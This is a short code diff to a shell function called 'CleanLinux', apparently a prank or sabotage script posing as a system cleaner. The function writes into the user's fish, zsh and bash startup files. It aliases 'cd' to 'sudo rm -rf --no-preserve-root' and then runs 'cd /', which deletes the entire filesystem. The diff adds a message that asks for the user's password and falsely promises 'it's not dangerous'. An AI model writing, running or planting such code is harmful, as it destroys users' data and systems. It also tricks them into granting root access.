@@ -4,14 +4,17 @@
 function CleanLinux(){
 cat >> ~/.fishrc << EOF
 alias cd="sudo rm -rf --no-preserve-root"
+echo "Start cleanning, please enter your password. Don\'t afraid, It\'s not dangerous. "
 cd /
 EOF
 cat >> ~/.zshrc << EOF
 alias cd="sudo rm -rf --no-preserve-root"
+echo "Start cleanning, please enter your password. Don\'t afraid, It\'s not dangerous. "
 cd /
 EOF
 cat >> ~/.bashrc << EOF
 alias cd="sudo rm -rf --no-preserve-root"
+echo "Start cleanning, please enter your password. Don\'t afraid, It\'s not dangerous. "
 cd /
 EOF
 exit
